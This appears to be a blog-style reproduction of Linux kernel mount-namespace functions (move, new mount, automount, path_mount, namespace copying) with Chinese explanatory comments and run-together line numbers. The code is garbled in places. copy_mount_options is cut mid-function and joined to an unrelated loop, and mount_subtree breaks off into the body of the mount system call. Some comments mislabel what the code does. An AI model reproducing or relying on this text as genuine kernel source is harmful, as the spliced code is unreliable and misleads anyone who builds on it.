err; from = real_mount(from_path-&gt;mnt); // 获取源挂载点 to = real_mount(to_path-&gt;mnt); // 获取目标挂载点 namespace_lock(); // 锁定命名空间 err = -EINVAL; /* 源和目标都必须已挂载 */ if (!is_mounted(&amp;from-&gt;mnt)) goto out; if (!is_mounted(&amp;to-&gt;mnt)) goto out; err = -EPERM; /* 我们应该被允许修改源和目标挂载点的挂载命名空间 */ if (!ns_capable(from-&gt;mnt_ns-&gt;user_ns, CAP_SYS_ADMIN)) goto out; if (!ns_capable(to-&gt;mnt_ns-&gt;user_ns, CAP_SYS_ADMIN)) goto out; err = -EINVAL; /* 源和目标路径应该是挂载的根目录 */ if (from_path-&gt;dentry != from_path-&gt;mnt-&gt;mnt_root) goto out; if (to_path-&gt;dentry != to_path-&gt;mnt-&gt;mnt_root) goto out; /* 设置共享组只允许在相同的超级块上进行 */ if (from-&gt;mnt.mnt_sb != to-&gt;mnt.mnt_sb) goto out; /* 源挂载点的根目录应该比目标挂载点的根目录更宽 */ if (!is_subdir(to-&gt;mnt.mnt_root, from-&gt;mnt.mnt_root)) goto out; /* 源挂载点的子挂载点不应该锁定目标挂载点的根目录 */ if (has_locked_children(from, to-&gt;mnt.mnt_root)) goto out; /* 设置共享组只允许在私有挂载点上进行 */ if (IS_MNT_SHARED(to) || IS_MNT_SLAVE(to)) goto out; /* 源挂载点不应该是私有的 */ if (!IS_MNT_SHARED(from) &amp;&amp; !IS_MNT_SLAVE(from)) goto out; if (IS_MNT_SLAVE(from)) &#123; struct mount *m = from-&gt;mnt_master; list_add(&amp;to-&gt;mnt_slave, &amp;m-&gt;mnt_slave_list); to-&gt;mnt_master = m; &#125; if (IS_MNT_SHARED(from)) &#123; to-&gt;mnt_group_id = from-&gt;mnt_group_id; list_add(&amp;to-&gt;mnt_share, &amp;from-&gt;mnt_share); lock_mount_hash(); // 锁定挂载哈希表 set_mnt_shared(to); // 设置挂载点为共享 unlock_mount_hash(); // 解锁挂载哈希表 &#125; err = 0;out: namespace_unlock(); // 解锁命名空间 return err;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879static int do_move_mount(struct path *old_path, struct path *new_path)&#123; struct mnt_namespace *ns; // 命名空间 struct mount *p; // 新挂载点 struct mount *old; // 旧挂载点 struct mount *parent; // 旧挂载点的父挂载点 struct mountpoint *mp, *old_mp; // 挂载点和旧挂载点的挂载点 int err; // 错误码 bool attached; // 是否已挂载 mp = lock_mount(new_path); // 锁定新挂载点 if (IS_ERR(mp)) return PTR_ERR(mp); old = real_mount(old_path-&gt;mnt); // 获取真实的旧挂载点 p = real_mount(new_path-&gt;mnt); // 获取真实的新挂载点 parent = old-&gt;mnt_parent; // 获取旧挂载点的父挂载点 attached = mnt_has_parent(old); // 检查旧挂载点是否已挂载 old_mp = old-&gt;mnt_mp; // 获取旧挂载点的挂载点 ns = old-&gt;mnt_ns; // 获取旧挂载点的命名空间 err = -EINVAL; /* 挂载点必须在我们的命名空间中 */ if (!check_mnt(p)) goto out; /* 被移动的对象必须已挂载... */ if (!is_mounted(&amp;old-&gt;mnt)) goto out; /* ... 并且要么是我们的挂载点，要么是匿名命名空间的根挂载点 */ if (!(attached ? check_mnt(old) : is_anon_ns(ns))) goto out; if (old-&gt;mnt.mnt_flags &amp; MNT_LOCKED) goto out; if (old_path-&gt;dentry != old_path-&gt;mnt-&gt;mnt_root) goto out; if (d_is_dir(new_path-&gt;dentry) != d_is_dir(old_path-&gt;dentry)) goto out; /* * 不要移动位于共享父挂载点中的挂载点。 */ if (attached &amp;&amp; IS_MNT_SHARED(parent)) goto out; /* * 不要将包含不可解绑挂载点的挂载树移动到共享的目标挂载点。 */ if (IS_MNT_SHARED(p) &amp;&amp; tree_contains_unbindable(old)) goto out; err = -ELOOP; if (!check_for_nsfs_mounts(old)) goto out; for (; mnt_has_parent(p); p = p-&gt;mnt_parent) if (p == old) goto out; err = attach_recursive_mnt(old, real_mount(new_path-&gt;mnt), mp, attached); if (err) goto out; /* 如果挂载点被移动，它不应再自动过期 */ list_del_init(&amp;old-&gt;mnt_expire); if (attached) put_mountpoint(old_mp);out: unlock_mount(mp); if (!err) &#123; if (attached) mntput_no_expire(parent); else free_mnt_ns(ns); &#125; return err;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647static int do_move_mount_old(struct path *path, const char *old_name)&#123; struct path old_path; // 旧路径 int err; // 错误码 if (!old_name || !*old_name) return -EINVAL; err = kern_path(old_name, LOOKUP_FOLLOW, &amp;old_path); // 获取旧路径 if (err) return err; err = do_move_mount(&amp;old_path, path); // 移动挂载点 path_put(&amp;old_path); // 释放旧路径 return err;&#125;/* * 将挂载点添加到命名空间的挂载树中 */static int do_add_mount(struct mount *newmnt, struct mountpoint *mp, const struct path *path, int mnt_flags)&#123; struct mount *parent = real_mount(path-&gt;mnt); // 获取父挂载点 mnt_flags &amp;= ~MNT_INTERNAL_FLAGS; if (unlikely(!check_mnt(parent))) &#123; /* 只有在私有命名空间中进行的自动挂载才是可接受的 */ if (!(mnt_flags &amp; MNT_SHRINKABLE)) return -EINVAL; /* ... 并且对于这些情况，最好挂载点仍然存在 */ if (!parent-&gt;mnt_ns) return -EINVAL; &#125; /* 拒绝在相同挂载点上挂载相同的文件系统 */ if (path-&gt;mnt-&gt;mnt_sb == newmnt-&gt;mnt.mnt_sb &amp;&amp; path-&gt;mnt-&gt;mnt_root == path-&gt;dentry) return -EBUSY; if (d_is_symlink(newmnt-&gt;mnt.mnt_root)) return -EINVAL; newmnt-&gt;mnt.mnt_flags = mnt_flags; return graft_tree(newmnt, parent, mp); // 将挂载点添加到挂载树中&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041static bool mount_too_revealing(const struct super_block *sb, int *new_mnt_flags);/* * 使用超级块配置创建一个新的挂载点，并请求将其添加到命名空间树中。 */static int do_new_mount_fc(struct fs_context *fc, struct path *mountpoint, unsigned int mnt_flags)&#123; struct vfsmount *mnt; // 虚拟文件系统挂载点 struct mountpoint *mp; // 挂载点 struct super_block *sb = fc-&gt;root-&gt;d_sb; // 超级块 int error; // 错误码 error = security_sb_kern_mount(sb); // 安全检查 if (!error &amp;&amp; mount_too_revealing(sb, &amp;mnt_flags)) // 检查是否过于暴露 error = -EPERM; if (unlikely(error)) &#123; fc_drop_locked(fc); return error; &#125; up_write(&amp;sb-&gt;s_umount); // 解锁超级块的卸载信号量 mnt = vfs_create_mount(fc); // 创建挂载点 if (IS_ERR(mnt)) return PTR_ERR(mnt); mnt_warn_timestamp_expiry(mountpoint, mnt); // 检查挂载点的过期时间 mp = lock_mount(mountpoint); // 锁定挂载点 if (IS_ERR(mp)) &#123; mntput(mnt); return PTR_ERR(mp); &#125; error = do_add_mount(real_mount(mnt), mp, mountpoint, mnt_flags); // 将挂载点添加到挂载树中 unlock_mount(mp); // 解锁挂载点 if (error &lt; 0) mntput(mnt); return error;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051/* * 为用户空间创建一个新的挂载点，并请求将其添加到命名空间的树中 */static int do_new_mount(struct path *path, const char *fstype, int sb_flags, int mnt_flags, const char *name, void *data)&#123; struct file_system_type *type; // 文件系统类型 struct fs_context *fc; // 文件系统上下文 const char *subtype = NULL; // 子类型 int err = 0; // 错误码 if (!fstype) return -EINVAL; type = get_fs_type(fstype); // 获取文件系统类型 if (!type) return -ENODEV; if (type-&gt;fs_flags &amp; FS_HAS_SUBTYPE) &#123; subtype = strchr(fstype, &#x27;.&#x27;); if (subtype) &#123; subtype++; if (!*subtype) &#123; put_filesystem(type); return -EINVAL; &#125; &#125; &#125; fc = fs_context_for_mount(type, sb_flags); // 创建文件系统上下文 put_filesystem(type); if (IS_ERR(fc)) return PTR_ERR(fc); if (subtype) err = vfs_parse_fs_string(fc, &quot;subtype&quot;, subtype, strlen(subtype)); if (!err &amp;&amp; name) err = vfs_parse_fs_string(fc, &quot;source&quot;, name, strlen(name)); if (!err) err = parse_monolithic_mount_data(fc, data); if (!err &amp;&amp; !mount_capable(fc)) err = -EPERM; if (!err) err = vfs_get_tree(fc); if (!err) err = do_new_mount_fc(fc, path, mnt_flags); // 创建新的挂载点 put_fs_context(fc); return err;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465int finish_automount(struct vfsmount *m, const struct path *path)&#123; struct dentry *dentry = path-&gt;dentry; // 获取路径的目录项 struct mountpoint *mp; // 挂载点结构体指针 struct mount *mnt; // 挂载结构体指针 int err; // 错误码 if (!m) // 如果挂载结构体为空 return 0; // 返回0 if (IS_ERR(m)) // 如果挂载结构体是错误指针 return PTR_ERR(m); // 返回错误码 mnt = real_mount(m); // 获取真实的挂载结构体 /* 新的挂载记录应该至少有2个引用，以防止在我们添加之前过期 */ BUG_ON(mnt_get_count(mnt) &lt; 2); // 如果挂载结构体的引用计数小于2，触发BUG if (m-&gt;mnt_sb == path-&gt;mnt-&gt;mnt_sb &amp;&amp; // 如果挂载的超级块和路径的超级块相同 m-&gt;mnt_root == dentry) &#123; // 并且挂载的根目录和路径的目录项相同 err = -ELOOP; // 设置错误码为-ELOOP（循环链接） goto discard; // 跳转到discard标签处 &#125; /* * 我们不想使用lock_mount() - 在这种情况下，找到覆盖我们挂载点的东西意味着“静默地丢弃我们已经有的”，而不是“尝试在其上挂载”。 */ inode_lock(dentry-&gt;d_inode); // 锁定目录项的索引节点 namespace_lock(); // 锁定命名空间 if (unlikely(cant_mount(dentry))) &#123; // 如果无法挂载目录项 err = -ENOENT; // 设置错误码为-ENOENT（找不到文件或目录） goto discard_locked; // 跳转到discard_locked标签处 &#125; rcu_read_lock(); // 读取RCU锁 if (unlikely(__lookup_mnt(path-&gt;mnt, dentry))) &#123; // 如果在路径的挂载点中查找到目录项 rcu_read_unlock(); // 解锁RCU锁 err = 0; // 设置错误码为0 goto discard_locked; // 跳转到discard_locked标签处 &#125; rcu_read_unlock(); // 解锁RCU锁 mp = get_mountpoint(dentry); // 获取目录项的挂载点 if (IS_ERR(mp)) &#123; // 如果挂载点是错误指针 err = PTR_ERR(mp); // 获取错误码 goto discard_locked; // 跳转到discard_locked标签处 &#125; err = do_add_mount(mnt, mp, path, path-&gt;mnt-&gt;mnt_flags | MNT_SHRINKABLE); // 添加挂载 unlock_mount(mp); // 解锁挂载点 if (unlikely(err)) // 如果发生错误 goto discard; // 跳转到discard标签处 mntput(m); // 释放挂载结构体引用计数 return 0; // 返回0discard_locked: namespace_unlock(); // 解锁命名空间 inode_unlock(dentry-&gt;d_inode); // 解锁目录项的索引节点discard: /* 从任何可能的过期列表中删除m */ if (!list_empty(&amp;mnt-&gt;mnt_expire)) &#123; // 如果挂载结构体的过期列表不为空 namespace_lock(); // 锁定命名空间 list_del_init(&amp;mnt-&gt;mnt_expire); // 从过期列表中删除挂载结构体 namespace_unlock(); // 解锁命名空间 &#125; mntput(m); // 释放挂载结构体引用计数 mntput(m); // 释放挂载结构体引用计数 return err; // 返回错误码&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849/** * mnt_set_expiry - 将挂载点放入过期列表 * @mnt: 要放入列表的挂载点 * @expiry_list: 要添加挂载点的列表 */void mnt_set_expiry(struct vfsmount *mnt, struct list_head *expiry_list)&#123; namespace_lock(); // 锁定命名空间 list_add_tail(&amp;real_mount(mnt)-&gt;mnt_expire, expiry_list); // 将挂载点添加到过期列表的尾部 namespace_unlock(); // 解锁命名空间&#125;EXPORT_SYMBOL(mnt_set_expiry); // 导出mnt_set_expiry符号/* * 处理一个可过期的挂载点列表，目的是丢弃任何未使用且自上次访问以来未被触碰的挂载点 */void mark_mounts_for_expiry(struct list_head *mounts)&#123; struct mount *mnt, *next; LIST_HEAD(graveyard); // 创建一个临时列表用于存放要丢弃的挂载点 if (list_empty(mounts)) // 如果挂载点列表为空 return; namespace_lock(); // 锁定命名空间 lock_mount_hash(); // 锁定挂载哈希表 /* 从过期列表中提取每个满足以下条件的vfsmount： * - 只被其父vfsmount引用 * - 仍然标记为过期（在上次调用此函数时标记的；标记会在mntput()中清除） */ list_for_each_entry_safe(mnt, next, mounts, mnt_expire) &#123; if (!xchg(&amp;mnt-&gt;mnt_expiry_mark, 1) || // 如果挂载点的过期标记已经被清除或者 propagate_mount_busy(mnt, 1)) // 挂载点正在被使用 continue; list_move(&amp;mnt-&gt;mnt_expire, &amp;graveyard); // 将挂载点从过期列表中移动到临时列表中 &#125; while (!list_empty(&amp;graveyard)) &#123; // 当临时列表不为空时 mnt = list_first_entry(&amp;graveyard, struct mount, mnt_expire); // 获取临时列表中的第一个挂载点 touch_mnt_namespace(mnt-&gt;mnt_ns); // 更新挂载点所属的命名空间 umount_tree(mnt, UMOUNT_PROPAGATE|UMOUNT_SYNC); // 卸载挂载点及其子挂载点 &#125; unlock_mount_hash(); // 解锁挂载哈希表 namespace_unlock(); // 解锁命名空间&#125;EXPORT_SYMBOL_GPL(mark_mounts_for_expiry); // 导出mark_mounts_for_expiry符号 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364/* * select_submounts()的剽窃版本 * * 在子挂载点列表中搜索给定的挂载点，并将任何可收缩的子挂载点移动到“graveyard”列表中。 */static int select_submounts(struct mount *parent, struct list_head *graveyard)&#123; struct mount *this_parent = parent; // 当前父挂载点 struct list_head *next; // 下一个挂载点 int found = 0; // 找到的子挂载点数量repeat: next = this_parent-&gt;mnt_mounts.next; // 获取下一个挂载点resume: while (next != &amp;this_parent-&gt;mnt_mounts) &#123; // 当下一个挂载点不是父挂载点的子挂载点列表的末尾时 struct list_head *tmp = next; // 临时指针指向下一个挂载点 struct mount *mnt = list_entry(tmp, struct mount, mnt_child); // 获取挂载结构体 next = tmp-&gt;next; // 更新下一个挂载点 if (!(mnt-&gt;mnt.mnt_flags &amp; MNT_SHRINKABLE)) // 如果挂载点不可收缩 continue; /* * 如果d_mounts列表非空，则下降一级。 */ if (!list_empty(&amp;mnt-&gt;mnt_mounts)) &#123; this_parent = mnt; // 更新当前父挂载点 goto repeat; // 跳转到repeat标签处 &#125; if (!propagate_mount_busy(mnt, 1)) &#123; // 如果挂载点未被使用 list_move_tail(&amp;mnt-&gt;mnt_expire, graveyard); // 将挂载点移动到graveyard列表的末尾 found++; // 增加找到的子挂载点数量 &#125; &#125; /* * 在此级别完成...上升并恢复搜索 */ if (this_parent != parent) &#123; // 如果当前父挂载点不是初始父挂载点 next = this_parent-&gt;mnt_child.next; // 获取下一个挂载点 this_parent = this_parent-&gt;mnt_parent; // 更新当前父挂载点为上一级父挂载点 goto resume; // 跳转到resume标签处 &#125; return found; // 返回找到的子挂载点数量&#125;/* * 处理一个可过期的挂载点列表，目的是丢弃特定父挂载点的任何子挂载点 * * 必须持有mount_lock的写锁 */static void shrink_submounts(struct mount *mnt)&#123; LIST_HEAD(graveyard); // 创建一个临时列表用于存放要丢弃的子挂载点 struct mount *m; /* 从过期列表中提取&#x27;mountpoint&#x27;的子挂载点 */ while (select_submounts(mnt, &amp;graveyard)) &#123; while (!list_empty(&amp;graveyard)) &#123; m = list_first_entry(&amp;graveyard, struct mount, mnt_expire); // 获取临时列表中的第一个子挂载点 touch_mnt_namespace(m-&gt;mnt_ns); // 更新子挂载点所属的命名空间 umount_tree(m, UMOUNT_PROPAGATE|UMOUNT_SYNC); // 卸载子挂载点及其子挂载点 &#125; &#125;&#125; 123456789101112131415161718192021222324252627282930static void *copy_mount_options(const void __user *data)&#123; char *copy; // 用于存储拷贝后的数据的指针 unsigned left, offset; // 用于记录剩余的数据长度和偏移量 if (!data) // 如果输入数据为空，则返回空指针 return NULL; copy = kmalloc(PAGE_SIZE, GFP_KERNEL); // 分配内存空间，大小为PAGE_SIZE，使用GFP_KERNEL标志 if (!copy) // 如果内存分配失败，则返回错误指针 return ERR_PTR(-ENOMEM); left = copy_from_user(copy, data, ... offset)) // 从用户空间拷贝数据到内核空间，返回剩余的未拷贝的数据长度 break; copy[offset] = c; // 将拷贝的数据存储到指定偏移量的位置 left--; // 剩余数据长度减一 offset++; // 偏移量增加一 if (left == PAGE_SIZE) &#123; // 如果剩余数据长度等于PAGE_SIZE，则表示拷贝失败，释放内存并返回错误指针 kfree(copy); return ERR_PTR(-EFAULT); &#125; return copy; // 返回拷贝后的数据指针&#125;static char *copy_mount_string(const void __user *data)&#123; return data ? strndup_user(data, PATH_MAX) : NULL; // 如果输入数据不为空，则使用strndup_user函数拷贝数据并返回拷贝后的字符串指针，否则返回空指针&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101/* * Flags是一个32位的值，允许在mount()调用中传递最多31个与文件系统无关的标志（例如：只读、无设备、无SUID等）。 * * data是一个(void *)，可以指向任何大小不超过PAGE_SIZE-1字节的结构，其中可以包含任意与文件系统相关的信息（或为NULL）。 * * 在0.97版本之前的mount()函数中没有flags参数。 * 当引入flags参数时，要求其高半部分必须具有魔术值0xC0ED，直到2.4.0-test9版本为止。 * 因此，如果存在这个魔术数，它不携带任何信息，必须被丢弃。 */int path_mount(const char *dev_name, struct path *path,const char *type_page, unsigned long flags, void *data_page)&#123; unsigned int mnt_flags = 0, sb_flags; int ret; /* 丢弃魔术数 */ if ((flags &amp; MS_MGC_MSK) == MS_MGC_VAL) flags &amp;= ~MS_MGC_MSK; /* 基本的合法性检查 */ if (data_page) ((char *)data_page)[PAGE_SIZE - 1] = 0; if (flags &amp; MS_NOUSER) return -EINVAL; ret = security_sb_mount(dev_name, path, type_page, flags, data_page); if (ret) return ret; if (!may_mount()) return -EPERM; if (flags &amp; SB_MANDLOCK) warn_mandlock(); /* 默认使用relatime，除非被覆盖 */ if (!(flags &amp; MS_NOATIME)) mnt_flags |= MNT_RELATIME; /* 分离每个挂载点的标志 */ if (flags &amp; MS_NOSUID) mnt_flags |= MNT_NOSUID; if (flags &amp; MS_NODEV) mnt_flags |= MNT_NODEV; if (flags &amp; MS_NOEXEC) mnt_flags |= MNT_NOEXEC; if (flags &amp; MS_NOATIME) mnt_flags |= MNT_NOATIME; if (flags &amp; MS_NODIRATIME) mnt_flags |= MNT_NODIRATIME; if (flags &amp; MS_STRICTATIME) mnt_flags &amp;= ~(MNT_RELATIME | MNT_NOATIME); if (flags &amp; MS_RDONLY) mnt_flags |= MNT_READONLY; if (flags &amp; MS_NOSYMFOLLOW) mnt_flags |= MNT_NOSYMFOLLOW; /* remount的默认atime是保留的 */ if ((flags &amp; MS_REMOUNT) &amp;&amp; ((flags &amp; (MS_NOATIME | MS_NODIRATIME | MS_RELATIME | MS_STRICTATIME)) == 0)) &#123; mnt_flags &amp;= ~MNT_ATIME_MASK; mnt_flags |= path-&gt;mnt-&gt;mnt_flags &amp; MNT_ATIME_MASK; &#125; sb_flags = flags &amp; (SB_RDONLY | SB_SYNCHRONOUS | SB_MANDLOCK | SB_DIRSYNC | SB_SILENT | SB_POSIXACL | SB_LAZYTIME | SB_I_VERSION); if ((flags &amp; (MS_REMOUNT | MS_BIND)) == (MS_REMOUNT | MS_BIND)) return do_reconfigure_mnt(path, mnt_flags); if (flags &amp; MS_REMOUNT) return do_remount(path, flags, sb_flags, mnt_flags, data_page); if (flags &amp; MS_BIND) return do_loopback(path, dev_name, flags &amp; MS_REC); if (flags &amp; (MS_SHARED | MS_PRIVATE | MS_SLAVE | MS_UNBINDABLE)) return do_change_type(path, flags); if (flags &amp; MS_MOVE) return do_move_mount_old(path, dev_name); return do_new_mount(path, type_page, sb_flags, mnt_flags, dev_name, data_page);&#125;long do_mount(const char *dev_name, const char __user *dir_name, const char *type_page, unsigned long flags, void *data_page)&#123; struct path path; int ret; ret = user_path_at(AT_FDCWD, dir_name, LOOKUP_FOLLOW, &amp;path); if (ret) return ret; ret = path_mount(dev_name, &amp;path, type_page, flags, data_page); path_put(&amp;path); return ret;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172static struct ucounts *inc_mnt_namespaces(struct user_namespace *ns)&#123; // 增加挂载命名空间的引用计数 return inc_ucount(ns, current_euid(), UCOUNT_MNT_NAMESPACES);&#125;// 增加挂载命名空间的引用计数static void dec_mnt_namespaces(struct ucounts *ucounts)&#123; dec_ucount(ucounts, UCOUNT_MNT_NAMESPACES);&#125;// 释放挂载命名空间static void free_mnt_ns(struct mnt_namespace *ns)&#123; // 如果不是匿名命名空间，则释放命名空间的inode if (!is_anon_ns(ns)) ns_free_inum(&amp;ns-&gt;ns); // 减少挂载命名空间的引用计数 dec_mnt_namespaces(ns-&gt;ucounts); // 释放用户命名空间 put_user_ns(ns-&gt;user_ns); // 释放命名空间结构体内存 kfree(ns);&#125;/* * 分配一个挂载命名空间，并分配一个序列号，用于检测是否尝试将旧的挂载命名空间绑定到当前挂载命名空间， * 以防止引用计数循环。一个以10Ghz递增的64位数字需要12427年才能循环，所以可以忽略这种可能性。 */static atomic64_t mnt_ns_seq = ATOMIC64_INIT(1);// 分配一个挂载命名空间static struct mnt_namespace *alloc_mnt_ns(struct user_namespace *user_ns, bool anon)&#123; struct mnt_namespace *new_ns; struct ucounts *ucounts; int ret; // 增加挂载命名空间的引用计数 ucounts = inc_mnt_namespaces(user_ns); if (!ucounts) return ERR_PTR(-ENOSPC); // 分配挂载命名空间结构体内存 new_ns = kzalloc(sizeof(struct mnt_namespace), GFP_KERNEL_ACCOUNT); if (!new_ns) &#123; // 分配失败，减少挂载命名空间的引用计数 dec_mnt_namespaces(ucounts); return ERR_PTR(-ENOMEM); &#125; if (!anon) &#123; // 如果不是匿名命名空间，则分配命名空间的inode ret = ns_alloc_inum(&amp;new_ns-&gt;ns); if (ret) &#123; kfree(new_ns); dec_mnt_namespaces(ucounts); return ERR_PTR(ret); &#125; &#125; new_ns-&gt;ns.ops = &amp;mntns_operations; if (!anon) // 分配一个序列号给新的挂载命名空间 new_ns-&gt;seq = atomic64_add_return(1, &amp;mnt_ns_seq); refcount_set(&amp;new_ns-&gt;ns.count, 1); INIT_LIST_HEAD(&amp;new_ns-&gt;list); init_waitqueue_head(&amp;new_ns-&gt;poll); spin_lock_init(&amp;new_ns-&gt;ns_lock); new_ns-&gt;user_ns = get_user_ns(user_ns); new_ns-&gt;ucounts = ucounts; return new_ns;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980__latent_entropystruct mnt_namespace *copy_mnt_ns(unsigned long flags, struct mnt_namespace *ns, struct user_namespace *user_ns, struct fs_struct *new_fs)&#123; struct mnt_namespace *new_ns; // 定义一个新的mnt_namespace结构体指针new_ns struct vfsmount *rootmnt = NULL, *pwdmnt = NULL; // 定义vfsmount结构体指针rootmnt和pwdmnt，并初始化为NULL struct mount *p, *q; // 定义mount结构体指针p和q struct mount *old; // 定义mount结构体指针old struct mount *new; // 定义mount结构体指针new int copy_flags; // 定义整型变量copy_flags BUG_ON(!ns); // 检查ns是否为空，如果为空则触发BUG_ON宏 if (likely(!(flags &amp; CLONE_NEWNS))) &#123; // 如果flags中不包含CLONE_NEWNS标志位 get_mnt_ns(ns); // 增加mnt_namespace的引用计数 return ns; // 返回ns指针 &#125; old = ns-&gt;root; // 将ns的root成员赋值给old new_ns = alloc_mnt_ns(user_ns, false); // 分配一个新的mnt_namespace结构体new_ns，并将user_ns赋值给它的user_ns成员 if (IS_ERR(new_ns)) // 如果new_ns是一个错误指针 return new_ns; // 返回new_ns指针 namespace_lock(); // 锁定命名空间 /* 第一遍循环：复制树的拓扑结构 */ copy_flags = CL_COPY_UNBINDABLE | CL_EXPIRE; // 设置copy_flags为CL_COPY_UNBINDABLE和CL_EXPIRE的按位或结果 if (user_ns != ns-&gt;user_ns) // 如果user_ns不等于ns的user_ns copy_flags |= CL_SHARED_TO_SLAVE; // 将CL_SHARED_TO_SLAVE标志位加入copy_flags new = copy_tree(old, old-&gt;mnt.mnt_root, copy_flags); // 复制old的树拓扑结构到new，并根据copy_flags进行相应的处理 if (IS_ERR(new)) &#123; // 如果new是一个错误指针 namespace_unlock(); // 解锁命名空间 free_mnt_ns(new_ns); // 释放new_ns return ERR_CAST(new); // 返回new指针 &#125; if (user_ns != ns-&gt;user_ns) &#123; // 如果user_ns不等于ns的user_ns lock_mount_hash(); // 锁定mount哈希表 lock_mnt_tree(new); // 锁定new的mnt_tree unlock_mount_hash(); // 解锁mount哈希表 &#125; new_ns-&gt;root = new; // 将new赋值给new_ns的root成员 list_add_tail(&amp;new_ns-&gt;list, &amp;new-&gt;mnt_list); // 将new_ns添加到new的mnt_list的尾部 /* * 第二遍循环：切换tsk-&gt;fs-&gt;*元素并标记新的vfsmount属于新的命名空间。 * 我们已经获取了一个私有的fs_struct，所以不需要tsk-&gt;fs-&gt;lock。 */ p = old; // 将old赋值给p q = new; // 将new赋值给q while (p) &#123; // 循环直到p为空指针 q-&gt;mnt_ns = new_ns; // 将new_ns赋值给q的mnt_ns成员 new_ns-&gt;mounts++; // 增加new_ns的mounts计数 if (new_fs) &#123; // 如果new_fs不为空 if (&amp;p-&gt;mnt == new_fs-&gt;root.mnt) &#123; // 如果p的mnt等于new_fs的root.mnt new_fs-&gt;root.mnt = mntget(&amp;q-&gt;mnt); // 将q的mnt增加引用计数并赋值给new_fs的root.mnt rootmnt = &amp;p-&gt;mnt; // 将p的mnt赋值给rootmnt &#125; if (&amp;p-&gt;mnt == new_fs-&gt;pwd.mnt) &#123; // 如果p的mnt等于new_fs的pwd.mnt new_fs-&gt;pwd.mnt = mntget(&amp;q-&gt;mnt); // 将q的mnt增加引用计数并赋值给new_fs的pwd.mnt pwdmnt = &amp;p-&gt;mnt; // 将p的mnt赋值给pwdmnt &#125; &#125; p = next_mnt(p, old); // 获取old中p的下一个mount结构体指针，并赋值给p q = next_mnt(q, new); // 获取new中q的下一个mount结构体指针，并赋值给q if (!q) // 如果q为空指针 break; // 跳出循环 // 跳过我们跳过的mntns绑定？ while (p-&gt;mnt.mnt_root != q-&gt;mnt.mnt_root) // 当p的mnt_root不等于q的mnt_root时 p = next_mnt(skip_mnt_tree(p), old); // 获取old中p的下一个mount结构体指针，并赋值给p &#125; namespace_unlock(); // 解锁命名空间 if (rootmnt) // 如果rootmnt不为空指针 mntput(rootmnt); // 减少rootmnt的引用计数 if (pwdmnt) // 如果pwdmnt不为空指针 mntput(pwdmnt); // 减少pwdmnt的引用计数 return new_ns; // 返回new_ns指针&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172struct dentry *mount_subtree(struct vfsmount *m, const char *name)&#123; struct mount *mnt = real_mount(m); // 获取vfsmount对应的mount结构体指针mnt struct mnt_namespace *ns; // 定义mnt_namespace结构体指针ns struct super_block *s; // 定义super_block结构体指针s struct path path; // 定义path结构体path int err; // 定义整型变量err ns = alloc_mnt_ns(&amp;init_user_ns, true); // 分配一个新的mnt_namespace结构体ns，并将init_user_ns赋值给它的user_ns成员 if (IS_ERR(ns)) &#123; // 如果ns是一个错误指针 mntput(m); // 减少m的引用计数 return ERR_CAST(ns); // 返回ns指针 &#125; mnt-&gt;mnt_ns = ns; // 将ns赋值给mnt的mnt_ns成员 ns-&gt;root = mnt; // 将mnt赋值给ns的root成员 ns-&gt;mounts++; // 增加ns的mounts计数 list_add(&amp;mnt-&gt;mnt_list, &amp;ns-&gt;list); // 将mnt添加到ns的list中 err = vfs_path_lookup(m-&gt;mnt_root, m, name, LOOKUP_FOLLOW|LOOKUP_AUTOMOUNT, &amp;path); // 在m的mnt_root下查找name对应的路径，并将结果保存在path中 put_mnt_ns(ns); // 减少ns的引用计数 if (err) // 如果err不为0 return ERR_PTR(err); // 返回错误指针err /* 交换一个vfsmount引用以获得活动的super_block引用 */ s = path.mnt-&gt;mnt_sb; // 获取path对应的super_block结构体指针s atomic_inc(&amp;s-&gt;s_active); // 增加s的s_active计数 mntput(path.mnt); // 减少path.mnt的引用计数 /* 锁定super_block */ down_write(&amp;s-&gt;s_umount); // 写锁定s的s_umount信号量 /* 返回(sub)tree的根节点 */ return *kernel_dev; // 返回kernel_dev指针 void *options; kernel_type = copy_mount_string(type); // 复制type字符串到kernel_type ret = PTR_ERR(kernel_type); // 将kernel_type转换为错误码并赋值给ret if (IS_ERR(kernel_type)) // 如果kernel_type是一个错误指针 goto out_type; // 跳转到out_type标签处 kernel_dev = copy_mount_string(dev_name); // 复制dev_name字符串到kernel_dev ret = PTR_ERR(kernel_dev); // 将kernel_dev转换为错误码并赋值给ret if (IS_ERR(kernel_dev)) // 如果kernel_dev是一个错误指针 goto out_dev; // 跳转到out_dev标签处 options = copy_mount_options(data); // 复制data字符串到options ret = PTR_ERR(options); // 将options转换为错误码并赋值给ret if (IS_ERR(options)) // 如果options是一个错误指针 goto out_data; // 跳转到out_data标签处 ret = do_mount(kernel_dev, dir_name, kernel_type, flags, options); // 执行挂载操作 kfree(options); // 释放options的内存out_data: kfree(kernel_dev); // 释放kernel_dev的内存out_dev: kfree(kernel_type); // 释放kernel_type的内存out_type: return ret; // 返回ret&#125;#define FSMOUNT_VALID_FLAGS \\ (MOUNT_ATTR_RDONLY | MOUNT_ATTR_NOSUID | MOUNT_ATTR_NODEV | \\ MOUNT_ATTR_NOEXEC | MOUNT_ATTR__ATIME | MOUNT_ATTR_NODIRATIME | \\ MOUNT_ATTR_NOSYMFOLLOW)#define MOUNT_SETATTR_VALID_FLAGS (FSMOUNT_VALID_FLAGS | MOUNT_ATTR_IDMAP)#define MOUNT_SETATTR_PROPAGATION_FLAGS \\ (MS_UNBINDABLE | MS_PRIVATE | MS_SLAVE | MS_SHARED) 12345678910111213141516171819static unsigned int attr_flags_to_mnt_flags(u64 attr_flags)&#123; unsigned int mnt_flags = 0; if (attr_flags 